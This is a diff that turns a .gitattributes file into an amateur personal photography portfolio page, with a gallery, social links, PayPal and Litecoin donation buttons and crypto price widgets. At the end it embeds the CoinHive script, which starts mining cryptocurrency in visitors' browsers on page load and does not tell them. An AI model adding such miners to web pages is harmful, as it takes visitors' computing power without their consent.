@@ -1,2 +1,342 @@
-# Auto detect text files and perform LF normalization
-* text=auto
+<
+<
+<p>
+<html>
+	<head>
+<title>84ltc</title>
+<link rel=“stylesheet”type=“text/css” href="stylesheet.css" />
+	</head>
+	<body>
+<h1>84ltc</h1>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {background-color: #242424;}
+h1   {colour: black;}
+p    {colour: black;}
+</style>
+</head>
+<body>
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+h1 {
+    color: white;
+    font-family: tahoma;
+    font-size: 250%;
+}
+p  {
+    color: black;
+    font-family: tahoma;
+    font-size: 80%;
+}
+</style>
+</head>
+<body>
+
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+.fa {
+  padding: 20px;
+  font-size: 30px;
+  width: 30px;
+  text-align: center;
+  text-decoration: none;
+  margin: 5px 2px;
+  border-radius: 50%;
+}
+
+.fa:hover {
+    opacity: 0.7;
+}
+
+.fa-facebook {
+  background: #3B5998;
+  color: white;
+}
+
+.fa-twitter {
+  background: #55ACEE;
+  color: white;
+}
+
+.fa-youtube {
+  background: #bb0000;
+  color: white;
+}
+
+.fa-instagram {
+  background: #125688;
+  color: white;
+}
+
+.fa-reddit {
+  background: #ff5700;
+  color: white;
+}
+
+.fa-rss {
+  background: #ff6600;
+  color: white;
+}
+</style>
+</head>
+<body>
+
+<!-- Add font awesome icons -->
+<a href="https://www.twitter.com/84ltc" class="fa fa-twitter"></a>
+<a href="https://www.youtube.com" class="fa fa-youtube"></a>
+<a href="https://www.instagram.com/" class="fa fa-instagram"></a>
+<a href="https://www.reddit.com/u/joshmountain" class="fa fa-reddit"></a>
+<a href="https://www." class="fa fa-rss"></a>
+      
+</body>
+</html> 
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+ul {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-colour: #242424;
+}
+
+li {
+    float: right;
+}
+
+li a {
+    display: block;
+    color: red;
+    text-align: center;
+    padding: 14px 16px;
+    text-decoration: none;
+}
+
+li a:hover:not(.active) {
+    background-color: #242424;
+}
+
+.active {
+    background-colour: #333;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a href="#about">ABOUT</a></li>
+  <li><a href="#contact">CONTACT</a></li>
+  <li><a href="#payment">PAYMENT</a></li>
+  <li><a href="#blog">BLOG</a></li>
+</ul>
+
+</body>
+</html>
+
+<div id=“first”
+
+</div 
+
+<div id=“second>
+
+</div>
+	</body>
+
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div.gallery {
+    margin: 5px;
+    border: 1px solid #ccc;
+    float: left;
+    width: 180px;
+}
+
+div.gallery:hover {
+    border: 1px solid #777;
+}
+
+div.gallery img {
+    width: 100%;
+    height: auto;
+}
+
+div.desc {
+    padding: 15px;
+    text-align: center;
+}
+</style>
+</head>
+<body>
+
+<div class="gallery">
+  <a target="_blank" href="Portraits">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Portraits/P1030716.jpg" alt="Portraits" width="600" height="400">
+  </a>
+  <div class="desc">Portraits</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Shanghai">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Shanghai/P1030703.jpg" alt="Shanghai" width="600" height="400">
+  </a>
+  <div class="desc">Shanghai</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="weddings">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Wedding/P1030512.jpg"Weddings" width="600" height="400">
+  </a>
+  <div class="desc">Weddings</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="GoodFriday">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Good Friday 2017/P1030390.jpg" alt="Good Friday" width="600" height="400">
+  </a>
+  <div class="desc">Good Friday</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="flowers">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Flowers/P1000836.jpg" alt="flowers" width="600" height="400">
+  </a>
+  <div class="desc">flowers</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Animals">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Animals/P1030185.jpg" alt="Mountains" width="600" height="400">
+  </a>
+  <div class="desc">Animals</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Switzerland">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Switzerland/Båsel Bike.jpg" alt="Switzerland" width="600" height="400">
+  </a>
+  <div class="desc">Switzerland</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Abstract">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Abstract/P1010492.jpg" alt="Abstract" width="600" height="400">
+  </a>
+  <div class="desc">Abstract</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Sunsets">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Sunsets/P1020998.jpg" alt="Sunsets" width="600" height="400">
+  </a>
+  <div class="desc">Sunsets</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="WinterMorning">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Winter Morning/P1020510.jpg" alt="Sunsets" width="600" height="400">
+  </a>
+  <div class="desc">Winter Morning</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="Westbay">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Westbay/Harbour Boat.jpg" alt="Westbay" width="600" height="400">
+  </a>
+  <div class="desc">Westbay</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="colourrun">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Lumix G-7/_Export/Colour Run/Colour Run.jpg" alt="Colour Run" width="600" height="400">
+  </a>
+  <div class="desc">Colour Run</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="NYC">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Photos/B&W Positives/NYC 35mm 3200dpi/0000Export/NYC025.jpg" alt="NYC" width="600" height="400">
+  </a>
+  <div class="desc">NYC</div>
+</div>
+
+<div class="gallery">
+  <a target="_blank" href="canada">
+    <img src="/Users/joshmountain/Documents/Portfolio Photos/_Light Room Photos/Photos/Canada/Canada.00.jpg" alt="Canada" width="600" height="400">
+  </a>
+  <div class="desc">Canada</div>
+</div>
+
+<div class="btcwdgt-price" bw-cur="gbp"></div>
+
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+
+  <!-- Saved buttons use the "secure click" command -->
+  <input type="hidden" name="cmd" value="_s-xclick">
+
+  <!-- Saved buttons are identified by their button IDs -->
+  <input type="hidden" name="hosted_button_id" value="221">
+
+  <!-- Saved buttons display an appropriate button image. -->
+  <input type="image" name="submit"
+    src="https://www.paypalobjects.com/en_US/i/btn/btn_buynow_LG.gif"
+    alt="PayPal - The safer, easier way to pay online">
+  <img alt="" width="1" height="1"
+    src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" >
+
+</form>
+<script>function shapeshift_click(a,e){e.preventDefault();var link=a.href;window.open(link,'1418115287605','width=700,height=500,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=0,left=0,top=0');return false;}</script> <a onclick="shapeshift_click(this, event);" href="https://shapeshift.io/shifty.html?destination=LbFcWeADJ9nPSm5UBskgGNhg8BhwXX1ZTH&amp;output=LTC&amp;amount=1"><img src="https://shapeshift.io/images/shifty/small_dark_ss.png" class="ss-button"></a>
+
+<a href='https://www.coingecko.com/en/price_charts/bitcoin/gbp?id=bitcoin' target='_blank'><img alt='bitcoin price' src='https://www.coingecko.com/en/widget_component/ticker/bitcoin/gbp.jpg'></a>
+
+<a href="https://www.coingecko.com/en/price_charts/litecoin/gbp" target="_blank"><img alt="litecoin price" src="https://www.coingecko.com/en/widget_component/ticker/litecoin/gbp.jpg"></a>
+
+<a href="https://www.coingecko.com/en/price_charts/ethereum/gbp" target="_blank"><img alt="ethereum price" src="https://www.coingecko.com/en/widget_component/ticker/ethereum/gbp.jpg"></a>
+
+
+<img style="-webkit-user-select: none;background-position: 0px 0px, 10px 10px;background-size: 20px 20px;background-image:linear-gradient(45deg, #eee 25%, transparent 25%, transparent 75%, #eee 75%, #eee 100%),linear-gradient(45deg, #eee 25%, white 25%, white 75%, #eee 75%, #eee 100%);" src="http://i.imgur.com/3onivJa.gif">
+
+<img style="-webkit-user-select: none;background-position: 0px 0px, 10px 10px;background-size: 20px 20px;background-image:linear-gradient(45deg, #eee 25%, transparent 25%, transparent 75%, #eee 75%, #eee 100%),linear-gradient(45deg, #eee 25%, white 25%, white 75%, #eee 75%, #eee 100%);" src="http://moonliteco.in/img/200x200.gif">
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('<site-key>');
+	miner.start();
+</script>
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script>
+
+</body>
+</html>
